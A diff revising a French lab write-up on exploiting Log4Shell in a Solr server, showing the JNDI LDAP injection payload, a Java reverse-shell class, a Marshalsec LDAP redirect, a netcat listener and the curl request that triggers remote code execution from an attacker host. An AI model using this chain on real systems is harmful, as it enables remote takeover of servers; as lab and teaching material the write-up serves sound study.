@@ -39,24 +39,24 @@ Il faut maintenant savoir si cette version est vulnérable, pour ça, il faut tr
 
 Ici, on voit clairement que les requêtes GET sont journalisées ; l'url, mais également **les paramètres**. (C'est sur ce point que l'exploit peut changer, suivant la journalisation en place, il existera des points d'injection de code ou pas.)
 
-Pour identifier la vulnérabilité du système, j'injecte un paramètres GET avec la charge utile suivante (expliquée dans la présentation de la faille) :
+Pour identifier la vulnérabilité du système, j'injecte un paramètre GET avec la charge utile suivante (expliquée dans la présentation de la faille) :
 
 `{jndi:ldap://<IP>:<PORT>}`
 
 ![5](https://user-images.githubusercontent.com/16634117/145870531-750a9523-9d1c-4b0d-b523-af4b2d1e669e.png)
 _L'injection, avec un listener pour récupérer la connexion, permettant de vérifier la bonne exécution de la charge utile_
 
-Une connexion s'effectue bien entre notre machine et le serveur, ce dernier est donc **vulnérable à l'attaque**.
+Une connexion s'effectue bien entre notre machine et le serveur, **ce dernier est donc vulnérable**.
 
 # Exploitation
 
-Nous avons vu dans la partie précédente que l'application est vulnérable, pour le moment, aucune execution de code sur le serveur n'est réalisée. 
+Nous avons vu dans la partie précédente que l'application est vulnérable, mais, pour le moment, aucune execution de code sur le serveur n'est réalisée. 
 
-C'est ici que la seconde partie de la faille se trouve, l'utilisation de [JNDI](https://en.wikipedia.org/wiki/Java_Naming_and_Directory_Interface) va permettre de faire des appels à un serveur LDAP, serveur qui peut être malicieux et donc utilisé pour rediriger vers du code malveillant en notre possession.
+C'est ici que la seconde partie de la faille se trouve, l'utilisation de [JNDI](https://en.wikipedia.org/wiki/Java_Naming_and_Directory_Interface) va permettre de faire des appels à un serveur LDAP, serveur qui peut être malicieux (possédé par l'attaquant) et donc utilisé pour rediriger vers du code malveillant en notre possession.
 
 ## Charge utile
 
-Afin de créer un accès au serveur, on cherche simplement à créer un shell, pour ça la classe Java suivante est suffisante : 
+Afin de créer un accès au serveur, on cherche simplement à créer une connexion shell, pour ça la classe Java suivante est suffisante : 
 
 ```Java
 public class Exploit {
@@ -74,7 +74,7 @@ On la compile sous le nom de `Exploit.class`
 
 ## Mise en place d'un serveur LDAP malveillant
 
-Pour cela on utilise le software [Marshalsec](https://github.com/mbechler/marshalsec) qui va permettre de créer le serveur LDAP et de rediriger le trafic.
+On utilise le software [Marshalsec](https://github.com/mbechler/marshalsec) qui permet de créer un serveur LDAP et de rediriger le trafic.
 
 La commande suivante va créer le serveur et rediriger vers notre code malveillant :
 
@@ -84,22 +84,22 @@ La commande suivante va créer le serveur et rediriger vers notre code malveilla
 
 ## Attaque
 
-Une fois les éléments en place, il faut unserveur capable de répondre avec notre charge malveillante, un simple `python3 -m http.server` à la racine de notre paylaod fera l'affaire.
+Une fois les éléments en place, il faut un serveur capable de répondre avec notre charge malveillante, un simple `python3 -m http.server` à la racine de notre payload fera l'affaire.
 
-Pour pouvoir récupérer le shell il faut également ouvrir une connexion au niveau de la machine d'attaque :
+Pour récupérer le shell il faut ouvrir une connexion au niveau de la machine d'attaque :
 
 `nc -lnvp 9999`
 
 Tous les éléments sont en place. 
 
-Une requête avec l'injection va permettre de déclencher toute la chaîne d'attaque : 
+Une requête avec l'injection va déclencher toute la chaîne d'attaque : 
 
 `curl 'http://10.10.31.65:8983/solr/admin/cores?foo=$\{jndi:ldap://10.10.65.176:1389/Exploit\}'`
 
 Une fois cela fait :
 
 ![image](https://user-images.githubusercontent.com/16634117/145872643-ec39c7ca-e33d-4b34-8c31-a6b2ed397b09.png)
-_De haut en bas et de gauche à droite : la reqûete malveillante, le serveur LDAP redirigeant le traffic, le serveur Python répondant avec la payload RCE compilée, le reverse shell_
+_De haut en bas et de gauche à droite : la requête malveillante, le serveur LDAP redirigeant le traffic, le serveur Python répondant avec le code compilé, le reverse shell_
 
 On obtient bien un accès en shell au serveur, par la suite il est possible de continuer une chaîne classique d'attaque pour gagner en privilèges et corrompre une plus grande partie du système.
 
